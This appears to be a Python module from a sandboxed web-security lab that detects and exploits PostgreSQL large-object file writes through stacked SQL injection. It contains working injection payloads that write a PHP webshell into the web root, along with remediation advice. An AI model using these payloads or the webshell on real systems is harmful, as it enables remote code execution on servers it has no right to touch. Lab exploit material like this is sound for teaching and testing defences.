"""PostgreSQL large objects -> arbitrary file write (drop a webshell).

WHAT IT IS
==========
PostgreSQL's *large object* facility (``lo_from_bytea`` / ``lo_export`` /
``lo_import``) is a server-side BLOB store. To a superuser-equivalent role it is
also an **arbitrary file-write primitive**: ``lo_from_bytea`` materialises a blob
from caller-supplied bytes and hands back its OID, and ``lo_export`` dumps that
blob to *any path the database process can write*. Drop the bytes into the web
server's document root and you have written a webshell -- SQL injection escalates
straight to remote code execution, no UDF/extension required.

PostgreSQL also allows **stacked queries** (``q1 ; q2 ; q3``), so a single
injectable ``SELECT`` can carry the whole write chain. The demo sink mirrors a
real ``... ILIKE '%' || $q || '%'`` search built with naive string concatenation.

DISCOVER
========
The vulnerable endpoint is ``GET /pg/search?q=`` which builds
``SELECT name FROM products WHERE name ILIKE '%<q>%'`` by concatenation. We break
out of the string literal with ``x'`` and append a stacked statement. The fact
that a stacked ``lo_from_bytea(0, '...')`` returns a fresh integer OID in
``result["rows"]`` is the detection signal: a read-only product search has no
business minting large-object OIDs, so its appearance proves stacked-query
injection plus large-object access.

EXPLOIT
=======
Two requests:

1. ``q = "x' ; SELECT lo_from_bytea(0, '<CONTENT>') -- "`` where ``<CONTENT>`` is
   the webshell body (which embeds the flag). Any literal single quote inside the
   body is escaped as ``''`` per PostgreSQL string rules so it survives the
   parser. The response ``result["rows"]`` carries the new OID as an integer row;
   recover it with ``next(r[0] for r in rows if isinstance(r[0], int))``.
2. ``q = "x' ; SELECT lo_export(<oid>, 'webroot/shell.php') ; "
   "SELECT pg_read_file('webroot/shell.php') -- "`` -- ``lo_export`` writes the
   blob to the web root, and the chained ``pg_read_file`` reads it back so
   ``result["rows"]`` echoes the exact bytes written. The flag falls out of that
   echoed content, proving the file was written to disk.

FIX
===
* **Parameterise every query** (``cursor.execute("... ILIKE %s", ('%'+q+'%',))``)
  so input can never leave the data plane. This is the only real fix.
* Run the application's database role as a **least-privilege, non-superuser**
  account. ``lo_export`` / ``lo_import`` require ``pg_write_server_files`` /
  superuser; revoke it. Since PostgreSQL 11 these are no longer granted by
  default -- do not re-grant them.
* Disable stacked queries at the driver/protocol layer where possible (the
  extended query protocol / prepared statements send one statement per message).
* Keep the database process off the web document root; a DB role with no write
  access to ``webroot/`` cannot drop a shell even if injection exists.
"""
from __future__ import annotations

from typing import List

from weblab._types import Finding, Severity
from weblab.http_client import WebClient
from weblab.targetapp import constants as C

ENDPOINT = "/pg/search?q="

#: Where we drop the webshell inside the (sandbox-jailed) web root.
_SHELL_PATH = "webroot/shell.php"

#: The webshell body written to disk. It embeds the planted flag so reading the
#: file back proves the write succeeded. It contains a literal single quote
#: (``$_GET['c']``) so the escaping path (``'`` -> ``''``) is exercised too.
_WEBSHELL = (
    "<?php system($_GET['c']); // " + C.FLAGS["postgresql_large_objects"] + " ?>"
)


def _pg_escape(literal: str) -> str:
    """Escape a value for a PostgreSQL single-quoted string literal."""
    return literal.replace("'", "''")


#: The two injection payloads, in order. ``{oid}`` is filled in at runtime.
PAYLOADS: List[str] = [
    "x' ; SELECT lo_from_bytea(0, '" + _pg_escape(_WEBSHELL) + "') -- ",
    "x' ; SELECT lo_export({oid}, '" + _SHELL_PATH + "') ; "
    "SELECT pg_read_file('" + _SHELL_PATH + "') -- ",
]

REMEDIATION: str = (
    "Use parameterised queries (e.g. cursor.execute(\"... ILIKE %s\", "
    "('%'+q+'%',))) so input never reaches the SQL parser. Run the app's "
    "database role as a least-privilege, NON-superuser account and revoke "
    "pg_write_server_files / pg_read_server_files so lo_export/lo_import/"
    "pg_read_file are denied. Disable stacked queries at the driver layer, and "
    "keep the database process off the web document root."
)


def _first_int_row(rows: list) -> int:
    """Return the new large-object OID -- the first integer-valued row."""
    return next(r[0] for r in rows if isinstance(r[0], int))


def assess(client: WebClient) -> Finding:
    """Detect and exploit PostgreSQL large-object arbitrary file write.

    Performs the two-request chain: mint a large object holding the webshell,
    export it to the web root, and read it back to recover the planted flag.
    """
    flag = C.FLAGS["postgresql_large_objects"]

    finding = Finding(
        vuln="PostgreSQL Large Object File Write",
        endpoint=ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=False,
        remediation=REMEDIATION,
        extra={"payloads": list(PAYLOADS), "shell_path": _SHELL_PATH},
    )

    # -- Request 1: stacked lo_from_bytea -> a fresh OID proves injection. -----
    create_payload = PAYLOADS[0]
    resp1 = client.get("/pg/search", params={"q": create_payload})
    try:
        result1 = resp1.json()
    except ValueError:
        return finding
    rows1 = result1.get("rows") or []
    try:
        oid = _first_int_row(rows1)
    except StopIteration:
        # No integer OID came back -> the create did not stack; not exploitable.
        return finding

    # Detection confirmed: a read-only product search minted a large-object OID.
    finding.discovered = True
    finding.payload = create_payload
    finding.evidence = (
        f"stacked lo_from_bytea minted large object OID {oid} via {ENDPOINT} "
        f"(notices: {result1.get('notices')})"
    )

    # -- Request 2: lo_export to the web root + pg_read_file echoes it back. ---
    export_payload = PAYLOADS[1].format(oid=oid)
    resp2 = client.get("/pg/search", params={"q": export_payload})
    result2 = resp2.json()
    rows2 = result2.get("rows") or []
    written = next(
        (r[0] for r in rows2 if isinstance(r[0], str) and flag in r[0]),
        "",
    )

    finding.exploit_result = (
        f"Wrote webshell to {_SHELL_PATH} via lo_export(oid={oid}); "
        f"pg_read_file confirmed on-disk content: {written}"
    )
    finding.extra.update(
        {
            "oid": oid,
            "export_payload": export_payload,
            "written_content": written,
            "read_back_rows": rows2,
        }
    )
    return finding
